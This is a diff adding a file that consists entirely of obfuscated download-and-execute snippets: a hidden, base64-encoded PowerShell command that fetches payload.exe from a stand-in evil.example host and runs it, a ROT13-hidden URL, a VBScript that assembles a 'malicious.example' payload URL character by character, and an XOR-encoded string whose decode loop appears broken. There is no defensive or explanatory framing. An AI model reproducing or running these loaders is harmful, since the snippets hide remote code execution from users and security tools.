@@ -1,0 +1,18 @@
+powershell -nop -w hidden -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKAAi
+
+JAB1AHIAbAAgAD0AIAAiAGgAdAB0AHAAOgAvAC8AZQB2AGkAbAAuAGUAeABhAG0AcABsAGUALwBwAGEAeQBsAG8AYQBkAC4AZQB4AGUAIgA7AAoAJABwAGEAdABoACAAPQAgACQAZQBuAHYAOgBUAEUATQBQACAAKwAgACIAZABsAC4AZQB4AGUAIgA7AAoASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAJAB1AHIAbAAgAC0ATwB1AHQARgBpAGwAZQAgACQAcABhAHQAaAA7AAoAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAcABhAHQAaAAiACkA
+
+' ROT13: uggc://znvyvpvbhf.rknzcyr.pbz '
+
+Dim a
+a = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47)
+a = a & Chr(109) & Chr(97) & Chr(108) & Chr(105) & Chr(99) & Chr(105) & Chr(111) & Chr(117) & Chr(115)
+a = a & "." & ChrW(101) & Chr(120) & Chr(97) & Chr(109) & Chr(112) & Chr(108) & Chr(101)
+a = a & "/payload.exe"
+
+XOR_ENCODED = "3d202d2a36202d373b3b"
+KEY = 66
+
+# XOR decode (pseudo)
+for c in XOR_ENCODED:
+    print(chr(ord(c) ^ KEY))
